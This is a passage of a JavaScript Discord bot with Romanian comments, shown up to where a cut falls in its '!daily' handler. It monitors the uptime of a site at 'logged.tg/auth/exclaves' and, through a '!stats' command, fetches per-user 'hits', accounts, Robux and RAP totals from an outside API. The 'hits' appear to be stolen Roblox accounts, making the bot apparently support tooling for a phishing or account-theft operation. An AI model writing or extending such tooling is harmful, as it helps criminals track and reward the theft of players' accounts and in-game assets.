// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// 2️⃣ Server Express pentru keep-alive (Render)
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => res.send("Bot is alive ✅"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// 3️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

const TOKEN = process.env.DISCORD_BOT_TOKEN;

// 4️⃣ Funcții utile
function formatNumber(num) { return num?.toLocaleString() || "0"; }
function formatDuration(ms) {
  let sec = Math.floor(ms / 1000);
  let min = Math.floor(sec / 60);
  let hr = Math.floor(min / 60);
  sec %= 60; min %= 60;
  return `${hr}h ${min}m ${sec}s`;
}

// 5️⃣ Config Uptime Monitor
let lastUpTime = null;
let lastStatus = null;
const STATUS_CHANNEL_ID = "1437881455534674001";
const MAIN_SITE_URL = "https://www.logged.tg/auth/exclaves";
const MAIN_SITE_NAME = "EXECLAVES";

// 5.1️⃣ Monitor site la fiecare 30 secunde
setInterval(async () => {
  try {
    const start = Date.now();
    let res, ping;

    try { 
      const response = await fetch(MAIN_SITE_URL); 
      res = { ok: response.ok }; 
      ping = Date.now() - start; 
    } catch { 
      res = { ok: false }; 
      ping = null; 
    }

    let currentStatus = res.ok ? "UP" : "DOWN";
    if (res.ok && !lastUpTime) lastUpTime = Date.now();
    if (!res.ok) lastUpTime = null;

    if (currentStatus !== lastStatus) {
      const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
      if (channel) {
        const embed = new EmbedBuilder()
          .setColor(0x800080) // Purple
          .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif")
          .setDescription(
            `─── <a:breezy:1396413730757017692> **EXCLAVES STATUS** <a:breezy:1396413730757017692> ───\n\n` +
            `<a:Animated_Arrow_Purple:1418940595782549636> **${MAIN_SITE_NAME}**\n` +
            `<a:Animated_Arrow_Purple:1418940595782549636> STATUS: ${currentStatus}\n` +
            `<a:Animated_Arrow_Purple:1418940595782549636> Response Time: ${ping ? ping + "ms" : "N/A"}`
          )
          .setImage("https://i.imgur.com/bnuEGXF.gif")
          .setFooter({ text: "Site Uptime Monitor" });

        const statusMsg = currentStatus === "UP" 
          ? "✅ The site is back **UP**!" 
          : "⚠️ The site is **DOWN**!";
        
        await channel.send({ content: statusMsg, embeds: [embed] });
      }
      lastStatus = currentStatus;
    }

  } catch (err) { console.error("Error checking site:", err); }
}, 30000);

// 6️⃣ Event listener pentru mesaje
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();
      if (!data.success || !data.Normal) return message.reply("❌ No stats found for this user.");

      const normal = data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x800080) // Purple
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`─── <a:breezy:1396413730757017692> **EXCLAVES STATS** <a:breezy:1396413730757017692> ───

<a:Animated_Arrow_Purple:1418940595782549636> **User:** **${userName}**

<a:Animated_Arrow_Purple:1418940595782549636> **TOTAL STATS:**
Hits: ${formatNumber(normal.Totals?.Accounts)}
Visits: ${formatNumber(normal.Totals?.Visits)}
Clicks: ${formatNumber(normal.Totals?.Clicks)}

<a:Animated_Arrow_Purple:1418940595782549636> **BIGGEST HIT:**
Summary: ${formatNumber(normal.Highest?.Summary)}
RAP: ${formatNumber(normal.Highest?.Rap)}
Robux: ${formatNumber(normal.Highest?.Balance)}

<a:Animated_Arrow_Purple:1418940595782549636> **TOTAL HIT STATS:**
Summary: ${formatNumber(normal.Totals?.Summary)}
RAP: ${formatNumber(normal.Totals?.Rap)}
Robux: ${formatNumber(normal.Totals?.Balance)}
`)
        .setImage("https://i.imgur.com/bnuEGXF.gif")
        .setFooter({ text: "EXCLAVES Stats Bot" });

      await message.channel.send({ embeds: [embed] });

    } catch (err) {
      console.error('Error fetching stats:', err);
      message.reply("❌ Error fetching stats. Please try again later.");
    }
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=exclaves&userId=${targetId}`);
      const data = await res.json();
